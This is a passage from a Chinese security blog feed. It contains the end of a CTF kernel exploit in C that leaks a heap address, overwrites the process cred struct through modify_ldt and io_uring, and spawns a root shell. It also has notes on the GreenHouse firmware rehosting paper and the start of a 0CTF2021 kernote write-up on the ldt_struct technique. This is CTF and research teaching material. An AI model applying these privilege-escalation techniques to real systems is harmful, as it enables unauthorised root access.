class="number">0x1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(Data,<span class="number">0</span>,<span class="keyword">sizeof</span>(Data));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;desc,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_desc));</span><br><span class="line">    <span class="type">char</span> leak[<span class="number">0x10</span>];</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/game&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;fail to open dev&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    spawn_processes();</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. leak heap addr</span></span><br><span class="line">    ioctl(fd,<span class="number">114</span>,<span class="string">&quot;flag=123456789&quot;</span>);<span class="comment">//kmalloc(0x10)</span></span><br><span class="line">    init_uring();</span><br><span class="line">    ioctl(fd,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">114</span>,<span class="string">&quot;flag=123456789&quot;</span>);<span class="comment">//kfree</span></span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));<span class="comment">//write_ldt</span></span><br><span class="line">    read(fd,leak,<span class="number">0x10</span>);<span class="comment">//leak</span></span><br><span class="line">    leak_heap = *(<span class="type">size_t</span>*)leak;</span><br><span class="line">    <span class="keyword">if</span>((!leak_heap))</span><br><span class="line">        errExit(<span class="string">&quot;\033[31m[-] Could not leak heap_addr \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] leak heap_addr: \033[0m0x%lx\n&quot;</span>, leak_heap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. Find cred&#x27;struct by arbitrary address read </span></span><br><span class="line">    ioctl(fd,<span class="number">22</span>,<span class="number">0</span>);<span class="comment">//kfree</span></span><br><span class="line">    Data[<span class="number">0</span>] = leak_heap;</span><br><span class="line">    register_tag(&amp;ring,Data,<span class="number">2</span>);<span class="comment">//kzalloc</span></span><br><span class="line">    cred = find_cred(leak_heap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. Overwrite uid and gid by Arbitrary address write</span></span><br><span class="line">    close(fd);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/game&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;fail to open dev&quot;</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">114</span>,<span class="string">&quot;flag=123456789&quot;</span>);<span class="comment">//kmalloc(0x10)</span></span><br><span class="line">    ioctl(fd,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">114</span>,<span class="string">&quot;flag=123456789&quot;</span>);<span class="comment">//kfree</span></span><br><span class="line">    register_tag(&amp;ring1,Data,PAGESIZE/<span class="number">8</span> + <span class="number">1</span>);<span class="comment">//io_alloc_page_table</span></span><br><span class="line">    ioctl(fd,<span class="number">22</span>,<span class="number">0</span>);<span class="comment">//kfree</span></span><br><span class="line">    Data[<span class="number">0</span>] = cred+<span class="number">4</span>;</span><br><span class="line">    register_tag(&amp;ring2,Data,<span class="number">2</span>);<span class="comment">//tags[0] = cred+4</span></span><br><span class="line">    Data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    update_tag(&amp;ring1,(<span class="type">size_t</span>)Data,<span class="number">1</span>);<span class="comment">//&#123;long&#125;cred+4 = 0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        Data[<span class="number">0</span>] = cred+<span class="number">4</span>+<span class="number">8</span>*(i+<span class="number">1</span>);</span><br><span class="line">        update_tag(&amp;ring2,(<span class="type">size_t</span>)Data,<span class="number">1</span>);<span class="comment">//tags[0] = cred+4+8*(i+1)</span></span><br><span class="line">        Data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        update_tag(&amp;ring1,(<span class="type">size_t</span>)Data,<span class="number">1</span>);<span class="comment">//&#123;long&#125;cred+4+8*(i+1) = 0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Done \033[0m&quot;</span>);</span><br><span class="line">    spawn_root_shell();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m[-] It should never be here \033[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>liburing.h</code> 可以通过 <a href="https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896">git repo</a> 下载编译安装，据 readme 介绍该库不受 kernel version 影响。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">prepare build config</span></span><br><span class="line">./configure --cc=gcc --cxx=g++;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">build liburing</span></span><br><span class="line">make -j$(nproc)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">install liburing</span></span><br><span class="line">sudo make install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">complile exp</span></span><br><span class="line">gcc -static exp.c  -o exp -luring</span><br></pre></td></tr></table></figure>

<img src="/posts/3316df56/file-20251013194924252.png" class="" title="exp">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>GreenHouse论文笔记</title>
    <url>/posts/91b983cf.html</url>
    <content><![CDATA[<h2 id="论文概述"><a href="#论文概述" class="headerlink" title="论文概述"></a>论文概述</h2><p>论文题目：Greenhouse: Single-Service Rehosting of Linux-Based Firmware Binaries in User-Space Emulation<br>又看到了Yan大佬的名字，太牛了QWQ</p>
<p>感觉是个idea很好的paper，将之前一直局限于系统模拟fuzz的范围扩展到了用户模拟，不仅模拟难度会降低，而且开销以及fuzz难度都会降低。</p>
<p>作者收集了7140（数据集没有开源）个固件镜像（来自9个厂商，难以系统模拟起来的），成功模拟2841个固件镜像。通过用户级模拟的方式，可以绕过之前系统模拟的很多挑战，实现用户空间进程级模拟。成功检测到717个Nday漏洞以及26个0day漏洞。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>现阶段的rehosting方法基本上都依赖于外设无关的全系统模拟，将固件重新打包为标准文件系统格式，然后替换嵌入式内核为定制的rehosting内核，然后使用QEMU启动。<br>Firmadyne的模拟成功率仅有21%（能访问ip）；FirmAE的模拟成功率有79%，但是几乎半数的目标功能有问题。<br>作者提出了一个新的思路，其依据为NVD中的数据中过去的IoT漏洞中仅有14%是硬件相关漏洞。因此无需去追求高标准的模拟。因此，作者提出单服务的模拟方法。<br>作者使用RouterSploit工具来进行N-day漏洞的验证，并使用AFL++工具来实现用户空间的模糊测试。实现了对当前主流工具EQUAFL的200%的性能提升。<br>针对服务是否模拟成功的判断逻辑进行修正或者进一步检查。分为了模拟失败、部分模拟、完全模拟。</p>
<h2 id="论文贡献"><a href="#论文贡献" class="headerlink" title="论文贡献"></a>论文贡献</h2><ul>
<li>提出了用户空间单服务模拟的方法。</li>
<li>研究了该模拟过程并给出了模拟过程中可能存在的挑战</li>
<li>进行了大规模的评估，2841&#x2F;7140</li>
</ul>
<h2 id="论文内容"><a href="#论文内容" class="headerlink" title="论文内容"></a>论文内容</h2><h3 id="Rehosting"><a href="#Rehosting" class="headerlink" title="Rehosting"></a>Rehosting</h3><p>将模拟的完整程度分为两个部分：</p>
<ul>
<li>Extraction Fidelity：需要提取固件中的文件以及数据。</li>
<li>Execution Fidelity：是否存在外设接口。是否能够登入web管理页面。<img src="/posts/91b983cf/file-20250916100634983.png" class="">
提到了两个已有工作的分类方法：</li>
<li>完全模拟，原内核模拟，通用内核模拟，用户模拟，无模拟【Automated Dynamic Firmware Analysis at Scale: A Case Study on Embedded Web Interfaces】</li>
<li>无模拟测试，部分模拟，完全模拟，硬件参与模拟【JetSet】<br>作者基于以上标准对以往工作进行了总结整理如下：<img src="/posts/91b983cf/file-20250916101108267.png" class=""></li>
</ul>
<h3 id="单服务模拟"><a href="#单服务模拟" class="headerlink" title="单服务模拟"></a>单服务模拟</h3><p>作者对于单服务的定义：一个固件中会同时运行多个进程，进程之间会进行信息的交换从而完成整体的功能。我们可以根据数据的关联来建立进程之间的联系，并且定义单服务为一个进程的集合，该集合不会与集合外的进程进行交互通信。最终该服务的结构应该是一个树状结构，根节点为主要进程，其运行会依赖于其他的进程的正常运行。</p>
<h2 id="GreenHouse"><a href="#GreenHouse" class="headerlink" title="GreenHouse"></a>GreenHouse</h2><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>包括三个组成部分Runner，Checker，Fixer（还有Extractor，Crawler，不过不重要）：</p>
<img src="/posts/91b983cf/file-20250916102321140.png" class="">
<p>迭代化模拟（不断循环跟进，即Run-&gt;Check-&gt;Fix-&gt;Run…）</p>
<h4 id="Runner"><a href="#Runner" class="headerlink" title="Runner"></a>Runner</h4><p>通过QEMU-user在docker镜像内执行web server。<br>使用docker镜像保证迭代过程不会污染文件系统等内容；使用chroot确保路径正确。<br>Runner支持两个tracing mode：</p>
<ul>
<li>部分tracing模式：收集父进程以及所有子进程的系统调用链；</li>
<li>完全tracing模式：收集父进程以及所有子进程的系统调用以及指令内容（所有执行基本块的地址）<br>Runner启动了web server，等待60s后启动Checker来检查是否成功启动服务。如果没有，Runner则解析其跟踪的日志信息，检查是否存在wait loop，每隔10s调用Checker检查一遍。最终将log信息发送给Fixer。</li>
</ul>
<h4 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h4><p>检测模拟状态并将结果发送给Fixer，用于决定修复方法<br>Checker接受品牌名以及可能初始化端口。检测3种服务（HTTP，UPnP，DNS）</p>
<h4 id="Fixer"><a href="#Fixer" class="headerlink" title="Fixer"></a>Fixer</h4><p>基于traces和log信息来进行修复。</p>
<h4 id="Exporter"><a href="#Exporter" class="headerlink" title="Exporter"></a>Exporter</h4><p>导出docker tar包</p>
<h3 id="模拟评判标准"><a href="#模拟评判标准" class="headerlink" title="模拟评判标准"></a>模拟评判标准</h3><p>已有标准：执行trace符合预期；检测到网络功能；无crash<br>Stage 1: Unpack<br>提取完整文件系统，查看是否存在&#x2F;bin&#x2F;busybox以及&#x2F;bin&#x2F;sh<br>Stage 2: Execute<br>通过常见文件名匹配识别相关二进制程序。<br>Stage 3: Connect<br>与模拟的固件服务进行交互连接。需要目标服务执行其环境变量检查并且bind端口，开启socket通信。<br>Stage 4: Interact<br>尽可能提升Execution Fidelity。例如，移除CGI handlers中的CAPTCHA检验。例如通过检查HTTP返回码来检验模拟的Execution Fidelity。</p>
<h3 id="挑战以及解决方案"><a href="#挑战以及解决方案" class="headerlink" title="挑战以及解决方案"></a>挑战以及解决方案</h3><p>提出了8个挑战以及对应的“尽力而为”的解决方案</p>
<h4 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h4><h5 id="Miss-Paths（R1）"><a href="#Miss-Paths（R1）" class="headerlink" title="Miss Paths（R1）"></a>Miss Paths（R1）</h5><p>损坏的符号链接，缺少文件、文件夹，缺少库文件。通常，这些文件是在系统初始化启动时产生的。</p>
<h5 id="Runtime-Arguments（R2）"><a href="#Runtime-Arguments（R2）" class="headerlink" title="Runtime Arguments（R2）"></a>Runtime Arguments（R2）</h5><p>一些二进制程序会需要特定的命令行参数</p>
<h5 id="Peripheral-Access（R3）"><a href="#Peripheral-Access（R3）" class="headerlink" title="Peripheral Access（R3）"></a>Peripheral Access（R3）</h5><p>服务可能会尝试与硬件接口进行交互，例如访问&#x2F;dev目录中文件，或者访问特定内存区域(MMIO)</p>
<h5 id="NVRAM-Configuration（R4）"><a href="#NVRAM-Configuration（R4）" class="headerlink" title="NVRAM Configuration（R4）"></a>NVRAM Configuration（R4）</h5><p>存储配置信息</p>
<h5 id="Hard-coded-Network-Devices（R5）"><a href="#Hard-coded-Network-Devices（R5）" class="headerlink" title="Hard-coded Network Devices（R5）"></a>Hard-coded Network Devices（R5）</h5><p>网络设备可能硬编码了其默认IP地址以及设备名称。如果不存在则可能失败</p>
<h5 id="Multi-Binary-Behavior（R6）"><a href="#Multi-Binary-Behavior（R6）" class="headerlink" title="Multi-Binary Behavior（R6）"></a>Multi-Binary Behavior（R6）</h5><p>初始化时可能还需要启动其他进程通过IPC进行交互获取配置信息。</p>
<h5 id="Environment-Checks（R7）"><a href="#Environment-Checks（R7）" class="headerlink" title="Environment Checks（R7）"></a>Environment Checks（R7）</h5><p>环境检查</p>
<h5 id="Environment-Mangling（R8）"><a href="#Environment-Mangling（R8）" class="headerlink" title="Environment Mangling（R8）"></a>Environment Mangling（R8）</h5><p>破坏环境，有些进程可能会破坏GreenHouse的一些功能，例如可能进行stdout，stderr的重定向，从而导致QEMU-user的日志获取失败。</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><h5 id="File-Setup-I1-R1-R3-R7"><a href="#File-Setup-I1-R1-R3-R7" class="headerlink" title="File Setup (I1) - [R1, R3, R7]"></a>File Setup (I1) - [R1, R3, R7]</h5><p>使用strace系统调用，通过open,access系统调用来获取缺失的文件。创建空文件。如果发现备份或者位置错误，则将其移动到对应位置。</p>
<h5 id="File-Sanitization-I2-R3-R7"><a href="#File-Sanitization-I2-R3-R7" class="headerlink" title="File Sanitization (I2) - [R3, R7]"></a>File Sanitization (I2) - [R3, R7]</h5><p>外设访问通过&#x2F;dev&#x2F;的IO访问来操作，可以提供一个空文件来绕过。可以解决hang的问题。与Costin&#x2F;FirmAE类似</p>
<h5 id="Boot-up-Synchronization-I3-R1-R2-R7"><a href="#Boot-up-Synchronization-I3-R1-R2-R7" class="headerlink" title="Boot-up Synchronization (I3) - [R1, R2, R7]"></a>Boot-up Synchronization (I3) - [R1, R2, R7]</h5><p>使用FirmAE来进行全系统模拟并提取到其启动数据。即运行时环境，文件以及QEMU日志信息。可以获取到启动产生的文件，命令行参数以及NVRAM的配置信息。</p>
<h5 id="nvram-faker-I4-R4"><a href="#nvram-faker-I4-R4" class="headerlink" title="nvram-faker (I4) - [R4]"></a>nvram-faker (I4) - [R4]</h5><p>开源项目。hook了nvram_set等函数，可以获取到所有keys，从而更加全面。并提供了合理的键值对数据集。</p>
<h5 id="Runtime-ArgParser-I5-R2"><a href="#Runtime-ArgParser-I5-R2" class="headerlink" title="Runtime ArgParser (I5) - [R2]"></a>Runtime ArgParser (I5) - [R2]</h5><p>通过品牌以及web server名字来匹配可能的启动参数。</p>
<h5 id="Dummy-Network-Devices-I6-R5"><a href="#Dummy-Network-Devices-I6-R5" class="headerlink" title="Dummy  Network Devices (I6) - [R5]"></a>Dummy  Network Devices (I6) - [R5]</h5><p>来自FirmAE。修改QEMU bind syscall来记录bind的地址以及设备名。然后可以配置docker内网卡。</p>
<h5 id="Background-Script-Plugins-I7-R6"><a href="#Background-Script-Plugins-I7-R6" class="headerlink" title="Background Script Plugins (I7) - [R6]"></a>Background Script Plugins (I7) - [R6]</h5><p>识别依赖进程。</p>
<h5 id="IPv6-Workaround-I8-R5"><a href="#IPv6-Workaround-I8-R5" class="headerlink" title="IPv6 Workaround (I8) - [R5]"></a>IPv6 Workaround (I8) - [R5]</h5><p>实现了QEMU-user的IPV6功能</p>
<h5 id="Patching-sysinfo-I9-R7"><a href="#Patching-sysinfo-I9-R7" class="headerlink" title="Patching sysinfo() (I9) - [R7]"></a>Patching sysinfo() (I9) - [R7]</h5><p>可能会根据sysinfo信息去关闭服务。</p>
<h5 id="Logging-Behavior-I10-R8"><a href="#Logging-Behavior-I10-R8" class="headerlink" title="Logging Behavior (I10) - [R8]"></a>Logging Behavior (I10) - [R8]</h5><p>修改了QEMU的open, close系统调用，以及trace函数，来保留300-400的文件描述符数值用于log文件。<br>    #### Patching<br>    可以直接进行patch修改。从而绕过阻塞的代码。文章实现了三种patch策略：过早退出、循环等待、Crash指令<br>    使用angr来构建上下文相关的控制流图。然后可以通过控制流图来识别Premature Exit以及Wait Loop。<br>    ##### 过早退出 - [R7, R3]<br>    如果有些检查未满足，则会直接exit。尝试让其跳转到另外一个路径。<br>    ##### 循环等待 - [R3, R7]<br>    仅在未检测到网络连接时进行该patch，防止将packet处理逻辑也patch掉<br>    ##### Crash 指令 - [R3]<br>    将会crash的地址进行nop。如果crash地址位于lib库里，则需要通过CFG来patch caller函数<br>    仅在出现segmentation fault时进行。</p>
<h3 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h3><p>围绕以下四个问题展开：</p>
<ul>
<li>模拟性能与当前主流系统模拟对比</li>
<li>影响GreenHouse的模拟性能的因素</li>
<li>GreenHouse的模拟程度是否可以满足漏洞挖掘</li>
<li>GreenHouse模拟对于fuzz的性能提升</li>
</ul>
<h4 id="固件收集"><a href="#固件收集" class="headerlink" title="固件收集"></a>固件收集</h4><p>共爬取12943个固件镜像，然后筛除加密以及不完整的，以及不是Linux系统的，不是ARM，MIPS，X86架构的。然后将数据集与FirmAE的数据集（2023年最新版本）合并。最终获取到7140个固件镜像，涉及到1764个设备。是FirmAE（1124）的6.3倍，Costin（1925）的3.7倍。</p>
<h4 id="模拟结果"><a href="#模拟结果" class="headerlink" title="模拟结果"></a>模拟结果</h4><p>与FirmAE，EQUAFL进行对比。<br>评估Execution Fidelity程序。</p>
<img src="/posts/91b983cf/file-20250916113548653.png" class="">
<img src="/posts/91b983cf/file-20250916113650371.png" class="">
<img src="/posts/91b983cf/file-20251105164248697.png" class="">
<h4 id="重复度"><a href="#重复度" class="headerlink" title="重复度"></a>重复度</h4><p>FirmAE以及GreenHouse共可以模拟3981个服务，只有GreenHouse能模拟的服务占了1578个，证明了GreenHouse解决了一些系统模拟没有解决的问题。</p>
<img src="/posts/91b983cf/file-20250916113851683.png" class="">
<img src="/posts/91b983cf/file-20251105164313868.png" class="">
<img src="/posts/91b983cf/file-20251105164804614.png" class="">
<h4 id="其他服务"><a href="#其他服务" class="headerlink" title="其他服务"></a>其他服务</h4><p>使用SaTC来识别常见网络服务的二进制名。</p>
<img src="/posts/91b983cf/file-20250916114925580.png" class="">
<h4 id="解决方案的效果"><a href="#解决方案的效果" class="headerlink" title="解决方案的效果"></a>解决方案的效果</h4><img src="/posts/91b983cf/file-20250916115007076.png" class="">
<h4 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h4><img src="/posts/91b983cf/file-20250916115049740.png" class="">
<h4 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h4><p>与EQUAFL进行对比</p>
<img src="/posts/91b983cf/file-20250916115218638.png" class="">

<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul>
<li><a href="https://www.kylebot.net/slides/greenhouse.pdf">https://www.kylebot.net/slides/greenhouse.pdf</a></li>
<li><a href="https://www.usenix.org/system/files/usenixsecurity23-tay.pdf">https://www.usenix.org/system/files/usenixsecurity23-tay.pdf</a></li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>0CTF2021-kernote</title>
    <url>/posts/bece1787.html</url>
    <content><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>查看启动脚本， 开启 kaslr, smep, smap, pti 保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append &quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot; \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span class="line">-snapshot \</span><br><span class="line">-s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目 readme 中提供了一些内核的编译选项：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">CONFIG_SLAB=y</span></span><br><span class="line"><span class="string">CONFIG_SLAB_FREELIST_RANDOM=y</span></span><br><span class="line"><span class="string">CONFIG_SLAB_FREELIST_HARDENED=y</span></span><br><span class="line"><span class="string">CONFIG_HARDENED_USERCOPY=y</span></span><br><span class="line"><span class="string">CONFIG_STATIC_USERMODEHELPER=y</span></span><br><span class="line"><span class="string">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以发现使用 slab 分配器，开启了 HARDENED USERCOPY 保护，同时无法通过修改 modprobe_path 来利用。<br>查看 init 脚本，对应内核模块 kernote.ko：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mount -t devtmpfs devtmpfs /dev</span></span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev&gt;/proc/sys/kernel/hotplug</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo &quot;flag&#123;testflag&#125;&quot;&gt;/flag</span><br><span class="line">chmod 660 /flag</span><br><span class="line">insmod /kernote.ko</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/sbin/mdev -s</span></span><br><span class="line">chmod 666 /dev/kernote</span><br><span class="line">chmod 777 /tmp</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -f</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>分析提供的 kernote.ko 模块，注册了字符设备 kernote，注册了 ioctl 操作。</p>
<ul>
<li>0x6666：将 buf 末尾的对象指针赋给 note，这里可能会有 UAF</li>
<li>0x6667：申请对象，flag 为 GFP_KERNEL，size 为 0x8，由于为 slab，其会从 kmalloc-32 中获取对象。</li>
<li>0x6668：释放对象，但是没有清空 note 指针</li>
<li>0x6669：将 note 指向对象的内容写入 arg 值</li>
<li>0x666a：yzloser 说是写着玩的？？？（源码是 get_current_user() 函数）</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以利用在 kmalloc-32 内的结构体，但是由于没有读的功能，需要构造有任意读写的结构体。这里官方提供的是 ldt_struct 结构体。</p>
<h3 id="ldt-struct-结构体"><a href="#ldt-struct-结构体" class="headerlink" title="ldt_struct 结构体"></a>ldt_struct 结构体</h3><p>ldt 即局部段描述符表（Local Descriptor Table），其中存放着进程的段描述符，段寄存器当中存放着的段选择子便是段描述符表中的段描述符的索引。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">     * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">     * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">     * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">     * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">     * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>entries 指针为 desc_struct 结构体，即段描述符</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<p>低 32 位</p>
<table>
<thead>
<tr>
<th align="center">31~16</th>
<th align="center">15~0</th>
</tr>
</thead>
<tbody><tr>
<td align="center">段基址的 15~0 位</td>
<td align="center">段界限的 15~0 位</td>
</tr>
<tr>
<td align="center">段基址 32 位，段界限为 20 位，其所能够表示的地址范围为：</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>段基址 + （段粒度大小 x （段界限+1）） - 1</code></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">高 32 位</td>
<td align="center"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">31~24</th>
<th align="center">23</th>
<th align="center">22</th>
<th align="center">21</th>
<th align="center">20</th>
<th align="center">19~16</th>
<th align="center">15</th>
<th align="center">14~13</th>
<th align="center">12</th>
<th align="center">11~8</th>
<th align="center">7~0</th>
</tr>
</thead>
<tbody><tr>
<td align="center">段基址的 31~24 位</td>
<td align="center">G</td>
<td align="center">D&#x2F;B</td>
<td align="center">L</td>
<td align="center">AVL</td>
<td align="center">段界限的 19 ~16 位</td>
<td align="center">P</td>
<td align="center">DPL</td>
<td align="center">S</td>
<td align="center">TYPE</td>
<td align="center">段基址的 23~16 位</td>
</tr>
</tbody></table>
<p>各参数便不在此赘叙了，具其构造可以参见<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">全局描述符表（Global Descriptor Table） - arttnba3.cn</a></p>
<h3 id="modify-ldt-系统调用"><a href="#modify-ldt-系统调用" class="headerlink" title="modify_ldt 系统调用"></a>modify_ldt 系统调用</h3><p>通过 modify_ldt 可以获取或修改当前进程的 ldt</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span 